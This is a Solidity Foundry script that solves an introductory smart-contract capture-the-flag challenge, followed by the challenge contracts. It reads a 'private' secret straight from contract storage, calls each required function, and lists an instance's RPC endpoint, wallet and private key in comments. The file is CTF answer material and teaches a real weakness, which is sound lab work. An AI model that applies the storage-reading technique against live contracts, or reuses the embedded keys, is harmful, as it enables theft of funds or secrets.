// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x52A72d3787163F61f85f39008b3806549Ab6fF15);
    address wallet = 0x9b96d612e8992DF03259c01783a41087B3E2EbFc;
    Briefing public brief = setup.brief();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xb759a8c3f8f5d624bc90e1ae2e05aac8228076abeef986ee0501cc8edf4a90e2);

        bytes32 secret = vm.load(address(brief), bytes32(uint256(0)));
        console.logBytes32(secret);

        brief.verifyCall();
        (bool sent, ) = address(brief).call{value: 1 ether}("");
        require(sent);

        string memory name = "Casino Heist Player";
        brief.putSomething(1337, name, wallet);

        brief.firstDeposit{value: 5 ether}();

        brief.Finalize(secret);

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	849c69f1-c233-4cc2-831a-02c9346b3bb1
// RPC Endpoint	http://103.178.153.113:30001/849c69f1-c233-4cc2-831a-02c9346b3bb1
// Private Key	0xb759a8c3f8f5d624bc90e1ae2e05aac8228076abeef986ee0501cc8edf4a90e2
// Setup Contract	0x52A72d3787163F61f85f39008b3806549Ab6fF15
// Wallet	0x9b96d612e8992DF03259c01783a41087B3E2EbFc

contract Setup{
    Briefing public brief;

    constructor(bytes32 _secretPhrase) payable{
        brief = new Briefing(_secretPhrase);
    }

    function isSolved() public view returns(bool){
        return brief.completedBriefing();
    }

}

contract Briefing{
    bytes32 private secretPhrase;
    
    // Solved Tracker
    bool public completedCall;
    bool public completedInputation;
    bool public completedTransfer;
    bool public completedDeposit;
    bool public completedBriefing;

    constructor(bytes32 _secretPhrase){
        secretPhrase = _secretPhrase;
    } 

    function verifyCall() public {
        completedCall = true;
    }

    function putSomething(uint256 _numberInput, string memory _nameInput, address _player) public{
        require(completedCall, "Accept the Call First!");
        require(_player == msg.sender, "player can only register their own address.");
        require(_numberInput == 1337, "Why not 1337?");
        require(keccak256(abi.encodePacked("Casino Heist Player")) == keccak256(abi.encodePacked(_nameInput)),"Join the game?");
        completedInputation = true;
    }

    function firstDeposit() public payable{
        require(completedCall, "Accept the Call First!");
        require(msg.sender == tx.origin, "This Ensure that you are a Human being, not a Contract");
        require(msg.value == 5 ether, "First deposit amount must be 5 ether");
        completedDeposit = true;
    }

    function Finalize(bytes32 _secret) public{
        require(
            completedCall && 
            completedDeposit && 
            completedInputation &&
            completedTransfer, "To Finalize, everything must be completed before!");
        require(msg.sender == tx.origin, "Only EOA is allowed!");
        if(keccak256(abi.encodePacked(secretPhrase)) == keccak256(abi.encodePacked(_secret))){
            completedBriefing = true;
        }
    }

    receive() external payable{
        if(msg.value == 1 ether){
            completedTransfer = true;
        }
    }
}